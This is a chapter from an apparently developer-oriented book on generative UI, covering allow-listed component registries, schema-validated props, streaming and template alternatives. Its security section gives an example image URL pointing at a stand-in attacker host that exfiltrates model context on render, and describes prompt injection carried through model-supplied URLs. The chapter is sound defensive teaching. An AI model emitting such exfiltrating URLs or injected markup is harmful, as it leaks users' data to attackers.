---
title: Generative UI
part: 7
chapter: 0
slug: generative-ui
level: advanced
reading_time: 10
updated: 2026-09-07
tags: [ai, ux, generative-ui, react, security, streaming, typescript]
in_book: true
---

# Generative UI {#ch-generative-ui}

> Let the model choose which of your components to render, from a fixed allow-list, with props it cannot use to open a hole.

**In this chapter:** why prose is the wrong output for structured answers · the registry pattern · the security boundary · streaming a partial component · when a template beats generation

## 💡 The Core Idea

A model asked about last quarter's revenue returns a paragraph. The right answer is a chart, a table and a
link. **Generative UI is letting the model select the component, while your code owns what components
exist and what they may receive.**

The framing that keeps this safe is that the model is choosing a **branch**, not writing code. It emits a
component name and props; your renderer looks the name up in a registry you wrote, validates the props
against a schema you wrote, and renders a component you shipped. Nothing about the output is executed.

The version where the model emits HTML, JSX or a template that you evaluate is a different feature with a
different risk profile, and it is the one that goes wrong — model output is untrusted input arriving from
a system that reads attacker-controlled documents.

> The model picks from a menu you wrote. It does not get to write a new dish.

## How It Works

### The registry

```typescript
const registry = {
  chart: {
    schema: z.object({
      kind: z.enum(['line', 'bar']),
      series: z.array(z.object({ label: z.string().max(40), value: z.number() })).max(50),
    }),
    Component: Chart,
  },
  citation: {
    schema: z.object({ chunkId: z.string() }),   // an id, not a URL — see below
    Component: Citation,
  },
} as const;

function render(name: string, props: unknown) {
  const entry = registry[name as keyof typeof registry];
  if (!entry) return <Fallback />;                       // unknown name: render nothing special
  const parsed = entry.schema.safeParse(props);
  if (!parsed.success) return <Fallback />;              // bad props: never partially render
  return <entry.Component {...parsed.data} />;
}
```

Three properties make this defensible. **The name is a lookup, not a component reference** — an unknown
name renders a fallback rather than anything the model named. **Props are validated before render**, so a
missing field produces a fallback instead of a broken component. And **bounds are in the schema** — 50
series, 40 characters — because a model given an unbounded array will occasionally produce a very large
one.

### Getting the model to emit it

This is [structured output](#ch-structured-output) with a discriminated union, or a set of tools whose
"execution" is rendering.

```typescript
const UiBlock = z.discriminatedUnion('component', [
  z.object({ component: z.literal('chart'), props: registry.chart.schema }),
  z.object({ component: z.literal('citation'), props: registry.citation.schema }),
]);
```

A discriminated union constrains the model to names that exist, which removes most of the invalid-name
problem at the decoding step rather than at the fallback.

### The security boundary

Every prop is a value the model produced, partly from documents you do not control. Treat the prop list
as an attack surface and enumerate what each type can do.

| Prop type | Risk | Rule |
| --- | --- | --- |
| Text | Injected instructions displayed as fact | Render as text; never as HTML |
| URL (`href`, `src`) | Exfiltration channel, phishing target | Allow-list the origin, or pass an id and resolve server-side |
| Markdown | Script, images, arbitrary links | Strict allow-list of tags and attributes |
| An id | Safe | Resolve server-side against what the user may see |
| Raw HTML | Cross-site scripting | Never |

The URL row is the important one and links straight to
[Chapter ?? — Prompt Injection](#ch-prompt-injection). A model-controlled image source is an outward
channel: `https://attacker.example/x.png?d=<context>` exfiltrates on render, with no click required. That
is the third leg of the lethal trifecta added by a rendering decision.

**Pass ids, resolve server-side.** A citation prop should carry a chunk id, and your server should turn
that into a link only if the chunk was retrieved for this user.

> ⚠️ Rendering model output as Markdown with images enabled is an exfiltration channel unless image
> sources are restricted. It is the most commonly missed hole in a generative UI.

### Streaming a partial component

An object arrives field by field, so components render before their props are complete. Design for it.

- **Render a skeleton until the schema validates.** A chart with three of fifty points is misleading, not
  progressive.
- **Progressive is fine for text-shaped blocks**, wrong for anything a user reads as a number.
- **Never fire side effects on partial props.** A partial object is not a decision.

### When a template is better

| Situation | Use |
| --- | --- |
| The answer shape is predictable | A template chosen by a classifier — cheaper and deterministic |
| A handful of known intents | Route to a fixed layout, no generation |
| Genuinely varied, data-dependent answers | Generative UI |
| Anything with side effects — buttons that act | Templates plus explicit confirmation |

Most "generative UI" requirements are satisfied by a classifier picking one of five layouts, which is
faster, cheaper, testable and has no novel security surface.

## When to Use It

| Feature | Approach |
| --- | --- |
| Data assistant answering varied questions | Registry with chart, table and text blocks |
| Support assistant | Text plus citation blocks; nothing else needed |
| Anything that writes or spends | Templates, plus an explicit confirmation step |
| Prototype | A classifier and three templates first — measure whether generation is needed |

## Common Mistakes

**❌ Rendering model-produced HTML or Markdown without an allow-list**

> Cross-site scripting through an unusual channel, and an exfiltration path via image sources.

**❌ Letting the model supply URLs**

> A model-controlled `src` or `href` is an outward channel and a phishing surface. Pass ids.

**❌ Rendering partial structured output as if it were complete**

> A chart with three of fifty points is a wrong chart, not a loading state.

**✅ Validate props before render and fall back on failure**

> A fallback is a fine outcome. A half-rendered component with undefined props is not.

## 🔑 Key Takeaways

- The model selects from a registry you wrote; it never emits markup or code you evaluate.
- Validate props against a bounded schema before rendering, and fall back rather than partially render.
- Model-supplied URLs are an exfiltration channel — pass ids and resolve them server-side.
- Show a skeleton until a streamed object validates; a partial chart is wrong, not progressive.
- Most generative UI requirements are met better by a classifier choosing one of a few templates.

## Interview Questions

**Q: What is the risk in rendering components from model output?**

That the output is untrusted input from a system that reads documents an attacker may control. If the
model can name a component, it should only be able to name one from a registry I wrote, and if it can
supply props, those props need a schema with bounds. The sharp edge is URLs: a model-controlled image
source exfiltrates context on render with no click involved, which turns a rendering decision into the
outward channel that completes an injection path.

**Q: How do you structure it safely?**

A registry mapping names to a schema and a component, and a discriminated union in the output schema so
the model can only emit names that exist. At render time the name is a lookup and the props are validated;
anything unrecognised or invalid renders a fallback. That way the model is choosing a branch among
components I shipped, not producing anything that gets evaluated.

**Q: How do citations work without opening a hole?**

The model emits a chunk id, not a URL. The server resolves that id to a link only if the chunk was
actually retrieved for this user, which does two useful things at once — it stops a fabricated citation
from rendering as a real link, and it removes the model's ability to put an arbitrary destination in
front of the user. It also gives a free correctness check, since an id that was never retrieved is a
hallucinated citation.

**Q: What do you render while a structured response is still streaming?**

A skeleton, until the object validates. Progressive rendering is fine for text, where a half sentence is
obviously a half sentence, but a chart with three of fifty data points looks like a finished chart with
wrong data. And no side effects on partial props — a partially arrived object is not a decision the
system should act on.

**Q: When would you not build this?**

When the set of answer shapes is small and predictable, which is most of the time. A classifier choosing
among five templates is cheaper, faster, deterministic, testable, and introduces no new security surface.
I would reach for generative UI when the answer genuinely varies with the data in ways I cannot enumerate
in advance, and even then I would keep anything with side effects on a template with explicit
confirmation.

## What to Read Next

- [Chapter ?? — Structured Output](#ch-structured-output) — the mechanism the model emits blocks through
- [Chapter ?? — Prompt Injection](#ch-prompt-injection) — why a model-supplied URL is a security decision
- [Chapter ?? — Trust and Correctness UX](#ch-trust-and-correctness-ux) — what a citation block is for
